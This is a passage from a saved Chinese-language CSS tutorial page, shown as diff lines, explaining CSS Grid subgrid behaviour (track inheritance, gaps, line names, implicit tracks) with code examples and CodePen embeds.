+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/gORweor(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/gORweor">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>当子网格的 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 属性值都是 <code>subgrid</code> 时，子网格的列轨道和行轨道继承了子网格在父网格跨越区域的列轨道和行轨道。比如上例，子网格构建了一个显式的 <code>4 x 2</code> 网格。</p>
+
+<p>当子网格中的网格项目数量刚好和构建的网格中单元格数量相匹配时，网格项目的放置将按自动放置算法来放置：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-359.jpg" alt=""></p>
+
+<p>当子网格中的网格项目数量超过子网格中单元格数量时，网格项目会重叠在一起，比如示例中的 网格项目 G5 和 网格项目G9 重叠在一起：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-360.jpg" alt=""></p>
+
+<p>当子网格中的网格项目数量少于子网格中单元格数量时，网格中会留出空白网格区域：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-361.jpg" alt=""></p>
+
+<h3 class="content-title" data-index="3">子网格中没有隐式的网格</h3>
+
+<p>如果你需要自动放置网格项目，并且不知道有多少个网格项目，那么在创建子网格时就要注意，因为这将阻止创建额外的行来容纳这些网格项目。</p>
+
+<p>比如下面这个示例，父网格（<code>.grid__container</code>）是一个 <code>9 x 4</code> 的网格，并且在子网格（<code>.grid__container--subgrid</code>）的 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 设置了 <code>subgrid</code> 值，同时该网格项目使用 <code>grrid-column: 2 / 7</code> 和 <code>grid-row: 2 / 4</code> 跨越父网格多列和多行。另外，在子网格中的网格项目数量超过了子网格的单元格数量：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">9</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">7</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/XWgjExy.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/XWgjExy">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>在子网格中，我们有<code>12</code>个网格项目试图自动放置在十个网格单元格中。由于子网格在两个维度上，额外的两个网格项目无处可放，所以它们被放置在网格的最后一个轨道。</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-362.jpg" alt=""></p>
+
+<p>正如上图所示，子网格项目中的网格项目12、网格项目11 和 网格项目6 重叠在一起。</p>
+
+<p>如果我们去掉子网格（<code>.grid__container--subgrid</code>）的 <code>grid-template-rows</code>的值，我们就可以创建隐式的网格轨道，尽管这些网格轨道不会与父网格轨道一致，但需要多少就会创建多少。</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="No implicit grid in a subgridded dimension" src="./Grid布局：15-嵌套网格vs子网格_files/wvezmOe.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/wvezmOe">
+  No implicit grid in a subgridded dimension</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-363.jpg" alt=""></p>
+
+<h3 class="content-title" data-index="3">子网格中的间距</h3>
+
+<p>如果在父网格中指定了 <code>gap</code>、<code>column-gap</code> 或 <code>row-gap</code>，那么这将被传递到子网格中，因此子网格轨道之间的间距将与像网格轨道之间间距相同：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-364.jpg" alt=""></p>
+
+<p>但是在某些情况下，你可能希望子网格的轨道之间的间距要和父网格轨道之间的间距不同，甚至是子网格中轨道之间不存在间距，或者是父网格轨道之间不存在间距，而子网格轨道之间有一定的间距。那么可以显式在父网格和子网格中设置<code>gap</code>、<code>column-ga</code> 或 <code>row-gap</code> 不同的值：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="The gap properties and subgrid" src="./Grid布局：15-嵌套网格vs子网格_files/ZEypoGV.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/ZEypoGV">
+  The gap properties and subgrid</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>正如上面示例所示，父网格轨道之间的间距是<code>2rem</code>（在父网格中显式设置了<code>gap</code>的值为<code>2rem</code>），而子网格轨道之间的间距是 <code>1rem</code>（在子网格中显式设置了<code>gap</code>的值为<code>1rem</code>）：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-365.jpg" alt=""></p>
+
+<h2 class="content-title" data-index="2">子网格行为</h2>
+
+<p>一个子网格在浏览器中的表现行为大多数情况下就像一个正常的网格容器，除了以下这些情景。</p>
+
+<p>①：放置子网格会在它的子网格轨道和它在父网格中所跨越的轨道之间建立一种对应关系。这样，子网格和它的父网格之间共享的网格线就形成了子网格的显式网格，而它的轨道大小则由父网格来决定。</p>
+
+<p>②：子网格在子网格维度中（行轴和列轴）的显式轨道的数量总是与它在其父网格中所跨越的网格轨道的数量相对应。如果子网格在子网格维度中的网格跨度是确定的，那么每个子网格维度中的显式轨道数量就取自其在该维度中使用的网格跨度（不管其<code>grid-template-*</code>属性如何）；如果它的网格跨度是不确定的，那么它所使用的网格跨度就是从它的 <code>grid-template-*</code> 属性为该轴指定的显式轨道的数量中提取，并以<code>1</code>为限。</p>
+
+<p>③：子网格的网格放置属性（比如<code>grid-row</code>、<code>grid-column</code>和<code>grid-area</code>等）和它们使用的网格线编号都是针对子网格所覆盖的网格线，与子网格外的网格线被排除在其显式网格之外完全一致。例如，网格线的数字编号从子网格的第一条网格线开始编号，而不是从父网格的第一条网格线开始。子网格的网格线编号和位置规则服从子网格自己的书写模式（<code>writing-mode</code>），就像对一个嵌套的独立网格那样。</p>
+
+<p>④：由于子网格可以在其内容被放置之前被放置，子网格的网格线会自动接收在父网格的相应行上明确指定的网格线名称。这些名称是对子网格上本地指定的任何网格线名的补充。</p>
+
+<p>⑤：当一个子网格与父网格中由 <code>grid-template-areas</code> 属性声明创建的命名网格区域重叠时，隐式分配的网格线名会被分配到子网格中代表父网格的命名区域。</p>
+
+<blockquote>
+  <p><strong>注意，如果一个命名的网格区域只是部分地与子网格重叠，其隐式分配的网格线名称将被分配到子网格的第一和（或）最后一行，这样一个命名的网格区域就存在，代表子网格的部分重叠区域；因此子网格的网格线名分配可能并不总是与父网格的网格线名分配完全一致。</strong></p>
+</blockquote>
+
+<p>这些名称也是对子网格上指定的任何网格线补充。</p>
+
+<p>比如下面这个示例，父网格的四个列轨道既有显式的网格线名称，也有由<code>grid-template-areas</code> 生成的隐式网格线名称：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"outer"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>A<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"middle"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>B1<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"inner"</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>B21<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+            <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>B22<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>C<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span>D<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+
+/* CSS */
+.outer {
+    display: grid;
+    grid-template-columns: [outer-edge] 1fr [main-start] 2fr [center] 3fr max-content [main-end];
+    grid-template-areas: "gutter info info photos";
+    gap: 1rem;
+}
+
+.middle {
+    grid-column: main-start / main-end;
+    display: grid;
+    grid-template-rows: subgrid;
+    grid-template-columns: subgrid;
+}
+
+.inner {
+    grid-column: center / -1;
+    display: grid;
+    grid-template-rows: subgrid;
+    grid-template-columns: subgrid;
+}
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/qBjaYvR.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/qBjaYvR">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-366.jpg" alt=""></p>
+
+<p>每个网格对应的网格线名称：</p>
+
+<pre class="sql"><code class="sql">.outer = [outer-edge gutter-<span class="operator"><span class="keyword"><span class="operator"><span class="keyword">start</span></span></span><span class="operator">] [gutter-<span class="keyword"><span class="keyword">end</span></span> info-<span class="keyword"><span class="keyword">start</span></span> main-<span class="keyword"><span class="keyword">start</span></span>] [center] [info-<span class="keyword"><span class="keyword">end</span></span> photos-<span class="keyword"><span class="keyword">start</span></span>] [main-<span class="keyword"><span class="keyword">end</span></span> photos-<span class="keyword"><span class="keyword">end</span></span>]
+.middle = [info-<span class="keyword"><span class="keyword">start</span></span> main-<span class="keyword"><span class="keyword">start</span></span>] [center] [info-<span class="keyword"><span class="keyword">end</span></span> photos-<span class="keyword"><span class="keyword">start</span></span>] [main-<span class="keyword"><span class="keyword">end</span></span> photos-<span class="keyword"><span class="keyword">end</span></span>]
+.<span class="keyword"><span class="keyword">inner</span></span> = [center info-<span class="keyword"><span class="keyword">start</span></span>] [info-<span class="keyword"><span class="keyword">end</span></span> photos-<span class="keyword"><span class="keyword">start</span></span>] [main-<span class="keyword"><span class="keyword">end</span></span> photos-<span class="keyword"><span class="keyword">end</span></span>]
+</span></span></code></pre>
+
+<p>请注意，所有显式分配的网格线名称都直接继承给<code>.inner</code>，但隐式分配的网格线名称是根据每个子网格与原始命名的网格区域的重叠度计算出来的。</p>
+
+<p>⑥：子网格在子网格的维度上没有任何隐式的网格轨道。当显式网格没有足够的网格线时，假设的隐式网格线照常被用来解决网格放置问题；但是每个网格项的网格区域被钳制在子网格的显式网格上。</p>
+
+<p>例如，如果一个跨度（<code>span</code>）为 <code>1</code> 的子网格有一个网格项目，并且该网格项目的 <code>grid-column</code>值为<code>2 / span 3</code>，那么这个网格项目就会被强制放入（并限制在）子网格中的第一个（唯一）轨道。</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">5</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="class"><span class="class">.grid__subitem</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / span <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/ZEypRQQ.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/ZEypRQQ">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-367.jpg" alt=""></p>
+
+<p>⑦：子网格本身在其父网格中是一个普通的网格项目，但在子网格维度中，它的作用就好像是完全空的轨道尺寸一样。</p>
+
+<p>⑧：子网格自己的网格项目参与子网格维度的大小，并在这些维度上与它对齐。在这个过程中，子网格的<code>margin</code>、<code>padding</code> 和 <code>border</code> 的总和被作为额外的一层（可能是负的）边距应用到这些边缘的项目上。这层额外的边距通过多层次的子网格累积起来。</p>
+
+<p>例如，我们创建了一个 <code>3 x 3</code> 的父网格：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">200</span></span>px auto <span class="number"><span class="number">200</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>如果一个子网格跨越了最后两个列轨道，那么它的前两列就对应着父网格的最后两列，任何定位在这些轨道上的网格项目都会参与到父网格的大小。具体来说，定位在子网格第一个轨道上的网格项目会影响到父网格中间轨道的自动调整：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> &gt; <span class="pseudo"><span class="pseudo">:first-child</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>如果子网格有<code>margin</code>、<code>padding</code> 和 <code>broder</code>，这些 <code>margin</code>、<code>padding</code> 和 <code>border</code> 的大小也会影响子网格尺寸。例如，如果子网格有 <code>100px</code> 的 <code>padding</code>：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>然后，子网格的第一个轨道中的网格项目就像它有一个额外的 <code>100px</code> 的上、左、下边距一样，影响到父网格的轨道的大小和网格项目自身的位置。</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">200</span></span>px auto <span class="number"><span class="number">200</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>);</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> subgrid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">padding</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> &gt; <span class="pseudo"><span class="pseudo">:first-child</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
